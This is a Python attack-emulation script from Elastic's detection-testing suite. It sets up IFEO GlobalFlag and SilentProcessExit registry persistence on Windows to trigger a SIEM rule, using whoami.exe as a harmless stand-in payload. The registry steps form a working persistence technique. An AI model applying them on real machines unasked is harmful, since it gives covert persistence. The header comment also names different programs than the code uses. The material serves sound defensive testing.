# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Persistence using GlobalFlags
# RTA: globalflags.py
# ATT&CK: T1183
# Description: Uses GlobalFlags option in Image File Execution Options to silently execute calc.exe after the monitored
#              process (notepad.exe) is closed.

import logging

from . import OSType, RuleMetadata, _common, _const, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="e09d904a-f3bb-4d36-8eb8-8c234812807c",
    name="globalflags",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[],
    siem_rules=[RuleMetadata(id="6839c821-011d-43bd-bd5b-acff00257226", name="Image File Execution Options Injection")],
    techniques=["T1546"],
)
def main():
    log.info("Setting up persistence using Globalflags")
    ifeo_subkey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe"
    spe_subkey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\netstat.exe"

    with _common.temp_registry_value(
        _const.REG_HKLM, ifeo_subkey, "GlobalFlag", 512, _const.DWORD
    ), _common.temp_registry_value(
        _const.REG_HKLM, spe_subkey, "ReportingMode", 1, _const.DWORD
    ), _common.temp_registry_value(
        _const.REG_HKLM, spe_subkey, "MonitorProcess", "C:\\Windows\\system32\\whoami.exe"
    ):
        log.info("Opening and closing netstat")
        _ = _common.execute_command("whoami", shell=True)
        _ = _common.execute_command(["taskkill", "/F", "/IM", "netstat.exe"])
